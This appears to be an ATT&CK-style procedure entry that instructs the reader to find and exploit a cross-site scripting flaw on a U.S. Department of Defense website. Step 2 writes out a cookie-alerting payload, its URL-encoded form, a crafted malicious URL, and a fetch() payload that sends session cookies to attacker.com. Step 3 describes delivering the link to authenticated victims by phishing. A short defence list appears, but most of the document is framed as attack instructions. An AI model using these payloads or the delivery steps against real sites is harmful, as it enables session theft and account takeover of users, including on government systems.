---
tags:
  - xss
  - script-injection
  - url-payload
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:47.165Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 5edcc85b-86a6-4369-8baa-c840ae56a8e2
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Craft-and-Deliver-XSS-Payload-via-URL

## Summary

This procedure demonstrates exploiting a reflected or stored XSS vulnerability by crafting a malicious URL that injects JavaScript into a web application, such as a U.S. Department of Defense site, to execute arbitrary code in the victim's browser and potentially steal session information or modify page content.

## Description

In this attack scenario, the target is a public-facing web application lacking proper input sanitization or output encoding. An attacker identifies a vulnerable input point, like a URL parameter, and embeds a JavaScript payload. When a victim accesses the URL, the payload executes in their browser context, allowing theft of cookies, session tokens, or DOM manipulation. This was demonstrated on a DoD website via a crafted URL, highlighting risks to sensitive session data in government environments. Prerequisites include knowledge of the site's structure and a method to deliver the URL (e.g., phishing). Expected outcomes: script execution leading to data exfiltration or defacement.

## Requirements

1. Access to craft and host/share URLs (internet connectivity)
2. Knowledge of the target site's vulnerable parameters (e.g., via reconnaissance)
3. Victim must be authenticated and interact with the site (social engineering needed)
4. Basic understanding of JavaScript and URL encoding

## Defense

Defensive measures and detection strategies:

- Implement strict Content Security Policy (CSP) to block inline scripts
- Sanitize all user inputs and encode outputs using HTML entity encoding
- Use Web Application Firewalls (WAF) to detect and block XSS payloads in URLs
- Monitor for anomalous JavaScript execution or unexpected alerts in browser logs
- Educate users on phishing and suspicious links

## Objectives

1. Inject and execute malicious JavaScript in the victim's browser
2. Exfiltrate sensitive session information like cookies or tokens
3. Modify web content to deceive or further exploit the user

## Instructions

### Step 1: Identify Vulnerable Endpoint

**Context**: Reconnoiter the target website to find inputs reflected in the output without sanitization, such as search fields or error messages in URLs.

Manually browse the DoD site and test parameters like `?q=` or `?redirect=` with benign inputs to see if they echo back unsanitized.

**Expected Output**: Confirmation of reflection, e.g., input appears as-is in the page source.

### Step 2: Craft Malicious Payload

**Context**: Design a JavaScript payload to test execution and achieve impact, such as alerting cookies or sending data to an attacker server.

Use a simple payload like `<script>alert(document.cookie)</script>`. URL-encode if needed: `%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`.

Construct the full URL: `https://dod-site.example.com/vulnerable?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`.

For exfiltration, replace alert with: `<script>fetch('https://attacker.com?cookie='+document.cookie)</script>`.

**Expected Output**: Payload ready for delivery.

### Step 3: Deliver and Test

**Context**: Trick the victim into accessing the URL while on the site to trigger execution in the authenticated context.

Share via email, chat, or shortened link. Test in a controlled environment first (e.g., own browser) to verify execution without harming production.

**Expected Output**: Script runs, showing alert or network request to attacker server with session data.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[web-vulnerability]]
- [[script-injection]]
